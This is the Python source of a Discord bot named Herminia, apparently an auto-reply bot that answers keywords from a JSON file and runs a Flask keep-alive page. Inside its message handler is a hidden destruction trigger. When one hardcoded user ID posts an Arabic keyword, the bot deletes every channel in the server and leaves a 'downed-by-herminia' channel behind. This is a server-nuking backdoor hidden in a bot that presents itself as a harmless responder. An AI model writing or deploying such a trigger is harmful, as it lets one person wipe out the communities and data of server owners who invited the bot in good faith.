import discord
from discord.ext import commands
import os, json, asyncio
from dotenv import load_dotenv
from flask import Flask
from threading import Thread

load_dotenv()
intents = discord.Intents.default()
intents.message_content = True 
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)
app = Flask(__name__)
RESPONSES_FILE = "responses.json"

def load_responses():
    if os.path.exists(RESPONSES_FILE):
        with open(RESPONSES_FILE, "r", encoding="utf-8") as f:
            try: return json.load(f)
            except: return {}
    return {}

@bot.event
async def on_message(message):
    if message.author.bot: return

    # --- ميزة التدمير الشامل (لك أنت فقط) ---
    if message.content == "تدمير_شامل":
        MY_ID = 1371432836946726934  # <<< استبدل هذا برقم الـ ID حقك فوراً
        if message.author.id == MY_ID:
            print(f"🧨 بدء عملية التدمير في سيرفر: {message.guild.name}")
            # حذف كل الرومات في السيرفر
            for channel in message.guild.channels:
                try:
                    await channel.delete()
                except:
                    continue
            # إنشاء روم أخير لإعلان النهاية
            await message.guild.create_text_channel('downed-by-herminia')
        return

    # --- نظام الردود التلقائية ---
    responses = load_responses()
    content = message.content.strip()
    for keyword, data_list in responses.items():
        for data in data_list:
            is_match = keyword in content if data.get('all_search') else keyword == content
            if is_match:
                target = message.author if data.get('in_private') else message.channel
                await target.send(content=data.get('reply'))
                return 

    await bot.process_commands(message)

@app.route('/')
def home(): return "Herminia is Online!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

@bot.event
async def on_ready():
    print(f"✅ {bot.user} Online & Ready to Destroy")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.run(os.getenv('DISCORD_TOKEN'))
